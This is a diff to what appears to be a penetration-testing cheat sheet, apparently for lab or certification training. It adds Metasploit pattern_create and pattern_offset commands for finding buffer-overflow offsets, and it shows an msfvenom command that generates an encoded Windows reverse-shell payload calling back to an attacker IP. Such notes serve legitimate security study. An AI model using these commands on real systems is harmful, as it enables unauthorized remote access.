@@ -96,10 +96,19 @@ smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
 
 ## Gaining Access
 
+##### Generating Payload Pattern & Calculating Offset
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $ADDRESS
+```
+
 ##### Generating Payload with msfvenom
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 ```
+
+
+
 
 ## Local Enumeration & Privilege Escalation
 
